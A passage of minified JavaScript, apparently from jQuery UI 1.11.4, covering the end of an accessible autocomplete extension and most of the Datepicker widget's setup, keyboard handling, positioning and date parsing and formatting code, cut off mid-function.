matcher.test(value.label||value.value||value)}))}}),$.widget("ui.autocomplete",$.ui.autocomplete,{options:{messages:{noResults:"No search results.",results:function(amount){return amount+(amount>1?" results are":" result is")+" available, use up and down arrow keys to navigate."}}},__response:function(content){var message;this._superApply(arguments),this.options.disabled||this.cancelSearch||(message=content&&content.length?this.options.messages.results(content.length):this.options.messages.noResults,this.liveRegion.children().hide(),$("<div>").text(message).appendTo(this.liveRegion))}});var datepicker_instActive;$.ui.autocomplete;function Datepicker(){this._curInst=null,this._keyEvent=!1,this._disabledInputs=[],this._datepickerShowing=!1,this._inDialog=!1,this._mainDivId="ui-datepicker-div",this._inlineClass="ui-datepicker-inline",this._appendClass="ui-datepicker-append",this._triggerClass="ui-datepicker-trigger",this._dialogClass="ui-datepicker-dialog",this._disableClass="ui-datepicker-disabled",this._unselectableClass="ui-datepicker-unselectable",this._currentClass="ui-datepicker-current-day",this._dayOverClass="ui-datepicker-days-cell-over",this.regional=[],this.regional[""]={closeText:"Done",prevText:"Prev",nextText:"Next",currentText:"Today",monthNames:["January","February","March","April","May","June","July","August","September","October","November","December"],monthNamesShort:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],dayNames:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],dayNamesShort:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],dayNamesMin:["Su","Mo","Tu","We","Th","Fr","Sa"],weekHeader:"Wk",dateFormat:"mm/dd/yy",firstDay:0,isRTL:!1,showMonthAfterYear:!1,yearSuffix:""},this._defaults={showOn:"focus",showAnim:"fadeIn",showOptions:{},defaultDate:null,appendText:"",buttonText:"...",buttonImage:"",buttonImageOnly:!1,hideIfNoPrevNext:!1,navigationAsDateFormat:!1,gotoCurrent:!1,changeMonth:!1,changeYear:!1,yearRange:"c-10:c+10",showOtherMonths:!1,selectOtherMonths:!1,showWeek:!1,calculateWeek:this.iso8601Week,shortYearCutoff:"+10",minDate:null,maxDate:null,duration:"fast",beforeShowDay:null,beforeShow:null,onSelect:null,onChangeMonthYear:null,onClose:null,numberOfMonths:1,showCurrentAtPos:0,stepMonths:1,stepBigMonths:12,altField:"",altFormat:"",constrainInput:!0,showButtonPanel:!1,autoSize:!1,disabled:!1},$.extend(this._defaults,this.regional[""]),this.regional.en=$.extend(!0,{},this.regional[""]),this.regional["en-US"]=$.extend(!0,{},this.regional.en),this.dpDiv=datepicker_bindHover($("<div id='"+this._mainDivId+"' class='ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all'></div>"))}function datepicker_bindHover(dpDiv){var selector="button, .ui-datepicker-prev, .ui-datepicker-next, .ui-datepicker-calendar td a";return dpDiv.delegate(selector,"mouseout",(function(){$(this).removeClass("ui-state-hover"),-1!==this.className.indexOf("ui-datepicker-prev")&&$(this).removeClass("ui-datepicker-prev-hover"),-1!==this.className.indexOf("ui-datepicker-next")&&$(this).removeClass("ui-datepicker-next-hover")})).delegate(selector,"mouseover",datepicker_handleMouseover)}function datepicker_handleMouseover(){$.datepicker._isDisabledDatepicker(datepicker_instActive.inline?datepicker_instActive.dpDiv.parent()[0]:datepicker_instActive.input[0])||($(this).parents(".ui-datepicker-calendar").find("a").removeClass("ui-state-hover"),$(this).addClass("ui-state-hover"),-1!==this.className.indexOf("ui-datepicker-prev")&&$(this).addClass("ui-datepicker-prev-hover"),-1!==this.className.indexOf("ui-datepicker-next")&&$(this).addClass("ui-datepicker-next-hover"))}function datepicker_extendRemove(target,props){for(var name in $.extend(target,props),props)null==props[name]&&(target[name]=props[name]);return target}$.extend($.ui,{datepicker:{version:"1.11.4"}}),$.extend(Datepicker.prototype,{markerClassName:"hasDatepicker",maxRows:4,_widgetDatepicker:function(){return this.dpDiv},setDefaults:function(settings){return datepicker_extendRemove(this._defaults,settings||{}),this},_attachDatepicker:function(target,settings){var nodeName,inline,inst;inline="div"===(nodeName=target.nodeName.toLowerCase())||"span"===nodeName,target.id||(this.uuid+=1,target.id="dp"+this.uuid),(inst=this._newInst($(target),inline)).settings=$.extend({},settings||{}),"input"===nodeName?this._connectDatepicker(target,inst):inline&&this._inlineDatepicker(target,inst)},_newInst:function(target,inline){return{id:target[0].id.replace(/([^A-Za-z0-9_\-])/g,"\\\\$1"),input:target,selectedDay:0,selectedMonth:0,selectedYear:0,drawMonth:0,drawYear:0,inline:inline,dpDiv:inline?datepicker_bindHover($("<div class='"+this._inlineClass+" ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all'></div>")):this.dpDiv}},_connectDatepicker:function(target,inst){var input=$(target);inst.append=$([]),inst.trigger=$([]),input.hasClass(this.markerClassName)||(this._attachments(input,inst),input.addClass(this.markerClassName).keydown(this._doKeyDown).keypress(this._doKeyPress).keyup(this._doKeyUp),this._autoSize(inst),$.data(target,"datepicker",inst),inst.settings.disabled&&this._disableDatepicker(target))},_attachments:function(input,inst){var showOn,buttonText,buttonImage,appendText=this._get(inst,"appendText"),isRTL=this._get(inst,"isRTL");inst.append&&inst.append.remove(),appendText&&(inst.append=$("<span class='"+this._appendClass+"'>"+appendText+"</span>"),input[isRTL?"before":"after"](inst.append)),input.unbind("focus",this._showDatepicker),inst.trigger&&inst.trigger.remove(),"focus"!==(showOn=this._get(inst,"showOn"))&&"both"!==showOn||input.focus(this._showDatepicker),"button"!==showOn&&"both"!==showOn||(buttonText=this._get(inst,"buttonText"),buttonImage=this._get(inst,"buttonImage"),inst.trigger=$(this._get(inst,"buttonImageOnly")?$("<img/>").addClass(this._triggerClass).attr({src:buttonImage,alt:buttonText,title:buttonText}):$("<button type='button'></button>").addClass(this._triggerClass).html(buttonImage?$("<img/>").attr({src:buttonImage,alt:buttonText,title:buttonText}):buttonText)),input[isRTL?"before":"after"](inst.trigger),inst.trigger.click((function(){return $.datepicker._datepickerShowing&&$.datepicker._lastInput===input[0]?$.datepicker._hideDatepicker():$.datepicker._datepickerShowing&&$.datepicker._lastInput!==input[0]?($.datepicker._hideDatepicker(),$.datepicker._showDatepicker(input[0])):$.datepicker._showDatepicker(input[0]),!1})))},_autoSize:function(inst){if(this._get(inst,"autoSize")&&!inst.inline){var findMax,max,maxI,i,date=new Date(2009,11,20),dateFormat=this._get(inst,"dateFormat");dateFormat.match(/[DM]/)&&(findMax=function(names){for(max=0,maxI=0,i=0;i<names.length;i++)names[i].length>max&&(max=names[i].length,maxI=i);return maxI},date.setMonth(findMax(this._get(inst,dateFormat.match(/MM/)?"monthNames":"monthNamesShort"))),date.setDate(findMax(this._get(inst,dateFormat.match(/DD/)?"dayNames":"dayNamesShort"))+20-date.getDay())),inst.input.attr("size",this._formatDate(inst,date).length)}},_inlineDatepicker:function(target,inst){var divSpan=$(target);divSpan.hasClass(this.markerClassName)||(divSpan.addClass(this.markerClassName).append(inst.dpDiv),$.data(target,"datepicker",inst),this._setDate(inst,this._getDefaultDate(inst),!0),this._updateDatepicker(inst),this._updateAlternate(inst),inst.settings.disabled&&this._disableDatepicker(target),inst.dpDiv.css("display","block"))},_dialogDatepicker:function(input,date,onSelect,settings,pos){var id,browserWidth,browserHeight,scrollX,scrollY,inst=this._dialogInst;return inst||(this.uuid+=1,id="dp"+this.uuid,this._dialogInput=$("<input type='text' id='"+id+"' style='position: absolute; top: -100px; width: 0px;'/>"),this._dialogInput.keydown(this._doKeyDown),$("body").append(this._dialogInput),(inst=this._dialogInst=this._newInst(this._dialogInput,!1)).settings={},$.data(this._dialogInput[0],"datepicker",inst)),datepicker_extendRemove(inst.settings,settings||{}),date=date&&date.constructor===Date?this._formatDate(inst,date):date,this._dialogInput.val(date),this._pos=pos?pos.length?pos:[pos.pageX,pos.pageY]:null,this._pos||(browserWidth=document.documentElement.clientWidth,browserHeight=document.documentElement.clientHeight,scrollX=document.documentElement.scrollLeft||document.body.scrollLeft,scrollY=document.documentElement.scrollTop||document.body.scrollTop,this._pos=[browserWidth/2-100+scrollX,browserHeight/2-150+scrollY]),this._dialogInput.css("left",this._pos[0]+20+"px").css("top",this._pos[1]+"px"),inst.settings.onSelect=onSelect,this._inDialog=!0,this.dpDiv.addClass(this._dialogClass),this._showDatepicker(this._dialogInput[0]),$.blockUI&&$.blockUI(this.dpDiv),$.data(this._dialogInput[0],"datepicker",inst),this},_destroyDatepicker:function(target){var nodeName,$target=$(target),inst=$.data(target,"datepicker");$target.hasClass(this.markerClassName)&&(nodeName=target.nodeName.toLowerCase(),$.removeData(target,"datepicker"),"input"===nodeName?(inst.append.remove(),inst.trigger.remove(),$target.removeClass(this.markerClassName).unbind("focus",this._showDatepicker).unbind("keydown",this._doKeyDown).unbind("keypress",this._doKeyPress).unbind("keyup",this._doKeyUp)):"div"!==nodeName&&"span"!==nodeName||$target.removeClass(this.markerClassName).empty(),datepicker_instActive===inst&&(datepicker_instActive=null))},_enableDatepicker:function(target){var nodeName,inline,$target=$(target),inst=$.data(target,"datepicker");$target.hasClass(this.markerClassName)&&("input"===(nodeName=target.nodeName.toLowerCase())?(target.disabled=!1,inst.trigger.filter("button").each((function(){this.disabled=!1})).end().filter("img").css({opacity:"1.0",cursor:""})):"div"!==nodeName&&"span"!==nodeName||((inline=$target.children("."+this._inlineClass)).children().removeClass("ui-state-disabled"),inline.find("select.ui-datepicker-month, select.ui-datepicker-year").prop("disabled",!1)),this._disabledInputs=$.map(this._disabledInputs,(function(value){return value===target?null:value})))},_disableDatepicker:function(target){var nodeName,inline,$target=$(target),inst=$.data(target,"datepicker");$target.hasClass(this.markerClassName)&&("input"===(nodeName=target.nodeName.toLowerCase())?(target.disabled=!0,inst.trigger.filter("button").each((function(){this.disabled=!0})).end().filter("img").css({opacity:"0.5",cursor:"default"})):"div"!==nodeName&&"span"!==nodeName||((inline=$target.children("."+this._inlineClass)).children().addClass("ui-state-disabled"),inline.find("select.ui-datepicker-month, select.ui-datepicker-year").prop("disabled",!0)),this._disabledInputs=$.map(this._disabledInputs,(function(value){return value===target?null:value})),this._disabledInputs[this._disabledInputs.length]=target)},_isDisabledDatepicker:function(target){if(!target)return!1;for(var i=0;i<this._disabledInputs.length;i++)if(this._disabledInputs[i]===target)return!0;return!1},_getInst:function(target){try{return $.data(target,"datepicker")}catch(err){throw"Missing instance data for this datepicker"}},_optionDatepicker:function(target,name,value){var settings,date,minDate,maxDate,inst=this._getInst(target);if(2===arguments.length&&"string"==typeof name)return"defaults"===name?$.extend({},$.datepicker._defaults):inst?"all"===name?$.extend({},inst.settings):this._get(inst,name):null;settings=name||{},"string"==typeof name&&((settings={})[name]=value),inst&&(this._curInst===inst&&this._hideDatepicker(),date=this._getDateDatepicker(target,!0),minDate=this._getMinMaxDate(inst,"min"),maxDate=this._getMinMaxDate(inst,"max"),datepicker_extendRemove(inst.settings,settings),null!==minDate&&void 0!==settings.dateFormat&&void 0===settings.minDate&&(inst.settings.minDate=this._formatDate(inst,minDate)),null!==maxDate&&void 0!==settings.dateFormat&&void 0===settings.maxDate&&(inst.settings.maxDate=this._formatDate(inst,maxDate)),"disabled"in settings&&(settings.disabled?this._disableDatepicker(target):this._enableDatepicker(target)),this._attachments($(target),inst),this._autoSize(inst),this._setDate(inst,date),this._updateAlternate(inst),this._updateDatepicker(inst))},_changeDatepicker:function(target,name,value){this._optionDatepicker(target,name,value)},_refreshDatepicker:function(target){var inst=this._getInst(target);inst&&this._updateDatepicker(inst)},_setDateDatepicker:function(target,date){var inst=this._getInst(target);inst&&(this._setDate(inst,date),this._updateDatepicker(inst),this._updateAlternate(inst))},_getDateDatepicker:function(target,noDefault){var inst=this._getInst(target);return inst&&!inst.inline&&this._setDateFromField(inst,noDefault),inst?this._getDate(inst):null},_doKeyDown:function(event){var onSelect,dateStr,sel,inst=$.datepicker._getInst(event.target),handled=!0,isRTL=inst.dpDiv.is(".ui-datepicker-rtl");if(inst._keyEvent=!0,$.datepicker._datepickerShowing)switch(event.keyCode){case 9:$.datepicker._hideDatepicker(),handled=!1;break;case 13:return(sel=$("td."+$.datepicker._dayOverClass+":not(."+$.datepicker._currentClass+")",inst.dpDiv))[0]&&$.datepicker._selectDay(event.target,inst.selectedMonth,inst.selectedYear,sel[0]),(onSelect=$.datepicker._get(inst,"onSelect"))?(dateStr=$.datepicker._formatDate(inst),onSelect.apply(inst.input?inst.input[0]:null,[dateStr,inst])):$.datepicker._hideDatepicker(),!1;case 27:$.datepicker._hideDatepicker();break;case 33:$.datepicker._adjustDate(event.target,event.ctrlKey?-$.datepicker._get(inst,"stepBigMonths"):-$.datepicker._get(inst,"stepMonths"),"M");break;case 34:$.datepicker._adjustDate(event.target,event.ctrlKey?+$.datepicker._get(inst,"stepBigMonths"):+$.datepicker._get(inst,"stepMonths"),"M");break;case 35:(event.ctrlKey||event.metaKey)&&$.datepicker._clearDate(event.target),handled=event.ctrlKey||event.metaKey;break;case 36:(event.ctrlKey||event.metaKey)&&$.datepicker._gotoToday(event.target),handled=event.ctrlKey||event.metaKey;break;case 37:(event.ctrlKey||event.metaKey)&&$.datepicker._adjustDate(event.target,isRTL?1:-1,"D"),handled=event.ctrlKey||event.metaKey,event.originalEvent.altKey&&$.datepicker._adjustDate(event.target,event.ctrlKey?-$.datepicker._get(inst,"stepBigMonths"):-$.datepicker._get(inst,"stepMonths"),"M");break;case 38:(event.ctrlKey||event.metaKey)&&$.datepicker._adjustDate(event.target,-7,"D"),handled=event.ctrlKey||event.metaKey;break;case 39:(event.ctrlKey||event.metaKey)&&$.datepicker._adjustDate(event.target,isRTL?-1:1,"D"),handled=event.ctrlKey||event.metaKey,event.originalEvent.altKey&&$.datepicker._adjustDate(event.target,event.ctrlKey?+$.datepicker._get(inst,"stepBigMonths"):+$.datepicker._get(inst,"stepMonths"),"M");break;case 40:(event.ctrlKey||event.metaKey)&&$.datepicker._adjustDate(event.target,7,"D"),handled=event.ctrlKey||event.metaKey;break;default:handled=!1}else 36===event.keyCode&&event.ctrlKey?$.datepicker._showDatepicker(this):handled=!1;handled&&(event.preventDefault(),event.stopPropagation())},_doKeyPress:function(event){var chars,chr,inst=$.datepicker._getInst(event.target);if($.datepicker._get(inst,"constrainInput"))return chars=$.datepicker._possibleChars($.datepicker._get(inst,"dateFormat")),chr=String.fromCharCode(null==event.charCode?event.keyCode:event.charCode),event.ctrlKey||event.metaKey||chr<" "||!chars||chars.indexOf(chr)>-1},_doKeyUp:function(event){var inst=$.datepicker._getInst(event.target);if(inst.input.val()!==inst.lastVal)try{$.datepicker.parseDate($.datepicker._get(inst,"dateFormat"),inst.input?inst.input.val():null,$.datepicker._getFormatConfig(inst))&&($.datepicker._setDateFromField(inst),$.datepicker._updateAlternate(inst),$.datepicker._updateDatepicker(inst))}catch(err){}return!0},_showDatepicker:function(input){var inst,beforeShow,beforeShowSettings,isFixed,offset,showAnim,duration;("input"!==(input=input.target||input).nodeName.toLowerCase()&&(input=$("input",input.parentNode)[0]),$.datepicker._isDisabledDatepicker(input)||$.datepicker._lastInput===input)||(inst=$.datepicker._getInst(input),$.datepicker._curInst&&$.datepicker._curInst!==inst&&($.datepicker._curInst.dpDiv.stop(!0,!0),inst&&$.datepicker._datepickerShowing&&$.datepicker._hideDatepicker($.datepicker._curInst.input[0])),!1!==(beforeShowSettings=(beforeShow=$.datepicker._get(inst,"beforeShow"))?beforeShow.apply(input,[input,inst]):{})&&(datepicker_extendRemove(inst.settings,beforeShowSettings),inst.lastVal=null,$.datepicker._lastInput=input,$.datepicker._setDateFromField(inst),$.datepicker._inDialog&&(input.value=""),$.datepicker._pos||($.datepicker._pos=$.datepicker._findPos(input),$.datepicker._pos[1]+=input.offsetHeight),isFixed=!1,$(input).parents().each((function(){return!(isFixed|="fixed"===$(this).css("position"))})),offset={left:$.datepicker._pos[0],top:$.datepicker._pos[1]},$.datepicker._pos=null,inst.dpDiv.empty(),inst.dpDiv.css({position:"absolute",display:"block",top:"-1000px"}),$.datepicker._updateDatepicker(inst),offset=$.datepicker._checkOffset(inst,offset,isFixed),$(window).width()<768&&(offset.top=$(input).offset().top+input.offsetHeight,$("html, body").animate({scrollTop:offset.top-$(window).outerHeight()/4},500)),inst.dpDiv.css({position:$.datepicker._inDialog&&$.blockUI?"static":isFixed?"fixed":"absolute",display:"none",left:offset.left+"px",top:offset.top+"px"}),inst.inline||(showAnim=$.datepicker._get(inst,"showAnim"),duration=$.datepicker._get(inst,"duration"),inst.dpDiv.css("z-index",function datepicker_getZindex(elem){for(var position,value;elem.length&&elem[0]!==document;){if(("absolute"===(position=elem.css("position"))||"relative"===position||"fixed"===position)&&(value=parseInt(elem.css("zIndex"),10),!isNaN(value)&&0!==value))return value;elem=elem.parent()}return 0}($(input))+1),$.datepicker._datepickerShowing=!0,$.effects&&$.effects.effect[showAnim]?inst.dpDiv.show(showAnim,$.datepicker._get(inst,"showOptions"),duration):inst.dpDiv[showAnim||"show"](showAnim?duration:null),$.datepicker._shouldFocusInput(inst)&&inst.input.focus(),$.datepicker._curInst=inst)))},_updateDatepicker:function(inst){this.maxRows=4,datepicker_instActive=inst,inst.dpDiv.empty().append(this._generateHTML(inst)),this._attachHandlers(inst);var origyearshtml,numMonths=this._getNumberOfMonths(inst),cols=numMonths[1],activeCell=inst.dpDiv.find("."+this._dayOverClass+" a");activeCell.length>0&&datepicker_handleMouseover.apply(activeCell.get(0)),inst.dpDiv.removeClass("ui-datepicker-multi-2 ui-datepicker-multi-3 ui-datepicker-multi-4").width(""),cols>1&&inst.dpDiv.addClass("ui-datepicker-multi-"+cols).css("width",17*cols+"em"),inst.dpDiv[(1!==numMonths[0]||1!==numMonths[1]?"add":"remove")+"Class"]("ui-datepicker-multi"),inst.dpDiv[(this._get(inst,"isRTL")?"add":"remove")+"Class"]("ui-datepicker-rtl"),inst===$.datepicker._curInst&&$.datepicker._datepickerShowing&&$.datepicker._shouldFocusInput(inst)&&inst.input.focus(),inst.yearshtml&&(origyearshtml=inst.yearshtml,setTimeout((function(){origyearshtml===inst.yearshtml&&inst.yearshtml&&inst.dpDiv.find("select.ui-datepicker-year:first").replaceWith(inst.yearshtml),origyearshtml=inst.yearshtml=null}),0))},_shouldFocusInput:function(inst){return inst.input&&inst.input.is(":visible")&&!inst.input.is(":disabled")&&!inst.input.is(":focus")},_checkOffset:function(inst,offset,isFixed){var dpWidth=inst.dpDiv.outerWidth(),dpHeight=inst.dpDiv.outerHeight(),inputWidth=inst.input?inst.input.outerWidth():0,inputHeight=inst.input?inst.input.outerHeight():0,viewWidth=document.documentElement.clientWidth+(isFixed?0:$(document).scrollLeft()),viewHeight=document.documentElement.clientHeight+(isFixed?0:$(document).scrollTop());return offset.left-=this._get(inst,"isRTL")?dpWidth-inputWidth:0,offset.left-=isFixed&&offset.left===inst.input.offset().left?$(document).scrollLeft():0,offset.top-=isFixed&&offset.top===inst.input.offset().top+inputHeight?$(document).scrollTop():0,offset.left-=Math.min(offset.left,offset.left+dpWidth>viewWidth&&viewWidth>dpWidth?Math.abs(offset.left+dpWidth-viewWidth):0),offset.top-=Math.min(offset.top,offset.top+dpHeight>viewHeight&&viewHeight>dpHeight?Math.abs(dpHeight+inputHeight):0),offset},_findPos:function(obj){for(var position,inst=this._getInst(obj),isRTL=this._get(inst,"isRTL");obj&&("hidden"===obj.type||1!==obj.nodeType||$.expr.filters.hidden(obj));)obj=obj[isRTL?"previousSibling":"nextSibling"];return[(position=$(obj).offset()).left,position.top]},_hideDatepicker:function(input){var showAnim,duration,postProcess,onClose,inst=this._curInst;!inst||input&&inst!==$.data(input,"datepicker")||this._datepickerShowing&&(showAnim=this._get(inst,"showAnim"),duration=this._get(inst,"duration"),postProcess=function(){$.datepicker._tidyDialog(inst)},$.effects&&($.effects.effect[showAnim]||$.effects[showAnim])?inst.dpDiv.hide(showAnim,$.datepicker._get(inst,"showOptions"),duration,postProcess):inst.dpDiv["slideDown"===showAnim?"slideUp":"fadeIn"===showAnim?"fadeOut":"hide"](showAnim?duration:null,postProcess),showAnim||postProcess(),this._datepickerShowing=!1,(onClose=this._get(inst,"onClose"))&&onClose.apply(inst.input?inst.input[0]:null,[inst.input?inst.input.val():"",inst]),this._lastInput=null,this._inDialog&&(this._dialogInput.css({position:"absolute",left:"0",top:"-100px"}),$.blockUI&&($.unblockUI(),$("body").append(this.dpDiv))),this._inDialog=!1)},_tidyDialog:function(inst){inst.dpDiv.removeClass(this._dialogClass).unbind(".ui-datepicker-calendar")},_checkExternalClick:function(event){if($.datepicker._curInst){var $target=$(event.target),inst=$.datepicker._getInst($target[0]);($target[0].id===$.datepicker._mainDivId||0!==$target.parents("#"+$.datepicker._mainDivId).length||$target.hasClass($.datepicker.markerClassName)||$target.closest("."+$.datepicker._triggerClass).length||!$.datepicker._datepickerShowing||$.datepicker._inDialog&&$.blockUI)&&(!$target.hasClass($.datepicker.markerClassName)||$.datepicker._curInst===inst)||$.datepicker._hideDatepicker()}},_adjustDate:function(id,offset,period){var target=$(id),inst=this._getInst(target[0]);this._isDisabledDatepicker(target[0])||(this._adjustInstDate(inst,offset+("M"===period?this._get(inst,"showCurrentAtPos"):0),period),this._updateDatepicker(inst))},_gotoToday:function(id){var date,target=$(id),inst=this._getInst(target[0]);this._get(inst,"gotoCurrent")&&inst.currentDay?(inst.selectedDay=inst.currentDay,inst.drawMonth=inst.selectedMonth=inst.currentMonth,inst.drawYear=inst.selectedYear=inst.currentYear):(date=new Date,inst.selectedDay=date.getDate(),inst.drawMonth=inst.selectedMonth=date.getMonth(),inst.drawYear=inst.selectedYear=date.getFullYear()),this._notifyChange(inst),this._adjustDate(target)},_selectMonthYear:function(id,select,period){var target=$(id),inst=this._getInst(target[0]);inst["selected"+("M"===period?"Month":"Year")]=inst["draw"+("M"===period?"Month":"Year")]=parseInt(select.options[select.selectedIndex].value,10),this._notifyChange(inst),this._adjustDate(target)},_selectDay:function(id,month,year,td){var inst,target=$(id);$(td).hasClass(this._unselectableClass)||this._isDisabledDatepicker(target[0])||((inst=this._getInst(target[0])).selectedDay=inst.currentDay=$("a",td).html(),inst.selectedMonth=inst.currentMonth=month,inst.selectedYear=inst.currentYear=year,this._selectDate(id,this._formatDate(inst,inst.currentDay,inst.currentMonth,inst.currentYear)))},_clearDate:function(id){var target=$(id);this._selectDate(target,"")},_selectDate:function(id,dateStr){var onSelect,target=$(id),inst=this._getInst(target[0]);dateStr=null!=dateStr?dateStr:this._formatDate(inst),inst.input&&inst.input.val(dateStr),this._updateAlternate(inst),(onSelect=this._get(inst,"onSelect"))?onSelect.apply(inst.input?inst.input[0]:null,[dateStr,inst]):inst.input&&inst.input.trigger("change"),inst.inline?this._updateDatepicker(inst):(this._hideDatepicker(),this._lastInput=inst.input[0],"object"!=typeof inst.input[0]&&inst.input.focus(),this._lastInput=null)},_updateAlternate:function(inst){var altFormat,date,dateStr,altField=this._get(inst,"altField");altField&&(altFormat=this._get(inst,"altFormat")||this._get(inst,"dateFormat"),date=this._getDate(inst),dateStr=this.formatDate(altFormat,date,this._getFormatConfig(inst)),$(altField).each((function(){$(this).val(dateStr)})))},noWeekends:function(date){var day=date.getDay();return[day>0&&day<6,""]},iso8601Week:function(date){var time,checkDate=new Date(date.getTime());return checkDate.setDate(checkDate.getDate()+4-(checkDate.getDay()||7)),time=checkDate.getTime(),checkDate.setMonth(0),checkDate.setDate(1),Math.floor(Math.round((time-checkDate)/864e5)/7)+1},parseDate:function(format,value,settings){if(null==format||null==value)throw"Invalid arguments";if(""===(value="object"==typeof value?value.toString():value+""))return null;var iFormat,dim,extra,date,iValue=0,shortYearCutoffTemp=(settings?settings.shortYearCutoff:null)||this._defaults.shortYearCutoff,shortYearCutoff="string"!=typeof shortYearCutoffTemp?shortYearCutoffTemp:(new Date).getFullYear()%100+parseInt(shortYearCutoffTemp,10),dayNamesShort=(settings?settings.dayNamesShort:null)||this._defaults.dayNamesShort,dayNames=(settings?settings.dayNames:null)||this._defaults.dayNames,monthNamesShort=(settings?settings.monthNamesShort:null)||this._defaults.monthNamesShort,monthNames=(settings?settings.monthNames:null)||this._defaults.monthNames,year=-1,month=-1,day=-1,doy=-1,literal=!1,lookAhead=function(match){var matches=iFormat+1<format.length&&format.charAt(iFormat+1)===match;return matches&&iFormat++,matches},getNumber=function(match){var isDoubled=lookAhead(match),size="@"===match?14:"!"===match?20:"y"===match&&isDoubled?4:"o"===match?3:2,digits=new RegExp("^\\d{"+("y"===match?size:1)+","+size+"}"),num=value.substring(iValue).match(digits);if(!num)throw"Missing number at position "+iValue;return iValue+=num[0].length,parseInt(num[0],10)},getName=function(match,shortNames,longNames){var index=-1,names=$.map(lookAhead(match)?longNames:shortNames,(function(v,k){return[[k,v]]})).sort((function(a,b){return-(a[1].length-b[1].length)}));if($.each(names,(function(i,pair){var name=pair[1];if(value.substr(iValue,name.length).toLowerCase()===name.toLowerCase())return index=pair[0],iValue+=name.length,!1})),-1!==index)return index+1;throw"Unknown name at position "+iValue},checkLiteral=function(){if(value.charAt(iValue)!==format.charAt(iFormat))throw"Unexpected literal at position "+iValue;iValue++};for(iFormat=0;iFormat<format.length;iFormat++)if(literal)"'"!==format.charAt(iFormat)||lookAhead("'")?checkLiteral():literal=!1;else switch(format.charAt(iFormat)){case"d":day=getNumber("d");break;case"D":getName("D",dayNamesShort,dayNames);break;case"o":doy=getNumber("o");break;case"m":month=getNumber("m");break;case"M":month=getName("M",monthNamesShort,monthNames);break;case"y":year=getNumber("y");break;case"@":year=(date=new Date(getNumber("@"))).getFullYear(),month=date.getMonth()+1,day=date.getDate();break;case"!":year=(date=new Date((getNumber("!")-this._ticksTo1970)/1e4)).getFullYear(),month=date.getMonth()+1,day=date.getDate();break;case"'":lookAhead("'")?checkLiteral():literal=!0;break;default:checkLiteral()}if(iValue<value.length&&(extra=value.substr(iValue),!/^\s+/.test(extra)))throw"Extra/unparsed characters found in date: "+extra;if(-1===year?year=(new Date).getFullYear():year<100&&(year+=(new Date).getFullYear()-(new Date).getFullYear()%100+(year<=shortYearCutoff?0:-100)),doy>-1)for(month=1,day=doy;;){if(day<=(dim=this._getDaysInMonth(year,month-1)))break;month++,day-=dim}if((date=this._daylightSavingAdjust(new Date(year,month-1,day))).getFullYear()!==year||date.getMonth()+1!==month||date.getDate()!==day)throw"Invalid date";return date},ATOM:"yy-mm-dd",COOKIE:"D, dd M yy",ISO_8601:"yy-mm-dd",RFC_822:"D, d M y",RFC_850:"DD, dd-M-y",RFC_1036:"D, d M y",RFC_1123:"D, d M yy",RFC_2822:"D, d M yy",RSS:"D, d M y",TICKS:"!",TIMESTAMP:"@",W3C:"yy-mm-dd",_ticksTo1970:24*(718685+Math.floor(492.5)-Math.floor(19.7)+Math.floor(4.925))*60*60*1e7,formatDate:function(format,date,settings){if(!date)return"";var iFormat,dayNamesShort=(settings?settings.dayNamesShort:null)||this._defaults.dayNamesShort,dayNames=(settings?settings.dayNames:null)||this._defaults.dayNames,monthNamesShort=(settings?settings.monthNamesShort:null)||this._defaults.monthNamesShort,monthNames=(settings?settings.monthNames:null)||this._defaults.monthNames,lookAhead=function(match){var matches=iFormat+1<format.length&&format.charAt(iFormat+1)===match;return matches&&iFormat++,matches},formatNumber=function(match,value,len){var num=""+value;if(lookAhead(match))for(;num.length<len;)num="0"+num;return num},formatName=function(match,value,shortNames,longNames){return lookAhead(match)?longNames[value]:shortNames[value]},output="",literal=!1;if(date)for(iFormat=0;iFormat<format.length;iFormat++)if(literal)"'"!==format.charAt(iFormat)||lookAhead("'")?output+=format.charAt(iFormat):literal=!1;else switch(format.charAt(iFormat)){case"d":output+=formatNumber("d",date.getDate(),2);break;case"D":output+=formatName("D",date.getDay(),dayNamesShort,dayNames);break;case"o":output+=formatNumber("o",Math.round((new Date(date.getFullYear(),date.getMonth(),date.getDate()).getTime()-new Date(date.getFullYear(),0,0).getTime())/864e5),3);break;case"m":output+=formatNumber("m",date.getMonth()+1,2);break;case"M":output+=formatName("M",date.getMonth(),monthNamesShort,monthNames);break;case"y":output+=lookAhead("y")?date.getFullYear():(date.getYear()%100<10?"0":"")+date.getYear()%100;break;case"@":output+=date.getTime();break;case"!":output+=1e4*date.getTime()+this._ticksTo1970;break;case"'":lookAhead("'")?output+="'":literal=!0;break;default:output+=format.charAt(iFormat)}return output},_possibleChars:function(format){var iFormat,chars="",literal=!1,lookAhead=function(match){var matches=iFormat+1<format.length&&format.charAt(iFormat+1)===match;return matches&&iFormat++,matches};for(iFormat=0;iFormat<format.length;iFormat++)if(literal)"'"!==format.charAt(iFormat)||lookAhead("'")?chars+=format.charAt(iFormat):literal=!1;else switch(format.charAt(iFormat)){case"d":case"m":case"y":case"@":chars+="0123456789";break;case"D":case"M":return null;case"'":lookAhead("'")?chars+="'":literal=!0;break;default:chars+=format.charAt(iFormat)}return chars},_get:function(inst,name){return void 0!==inst.settings[name]?inst.settings[name]:this._defaults[name]},_setDateFromField:function(inst,noDefault){if(inst.input.val()!==inst.lastVal){var dateFormat=this._get(inst,"dateFormat"),dates=inst.lastVal=inst.input?inst.input.val():null,defaultDate=this._getDefaultDate(inst),date=defaultDate,settings=this._getFormatConfig(inst);try{date=this.parseDate(dateFormat,dates,settings)||defaultDate}catch(event){dates=noDefault?"":dates}inst.selectedDay=date.getDate(),inst.drawMonth=inst.selectedMonth=date.getMonth(),inst.drawYear=inst.selectedYear=date.getFullYear(),inst.currentDay=dates?date.getDate():0,inst.currentMonth=dates?date.getMonth():0,inst.currentYear=dates?date.getFullYear():0,this._adjustInstDate(inst)}},_getDefaultDate:function(inst){return this._restrictMinMax(inst,this._determineDate(inst,this._get(inst,"defaultDate"),new Date))},_determineDate:function(inst,date,defaultDate){var newDate=null==date||""===date?defaultDate:"string"==typeof date?function(offset){try{return 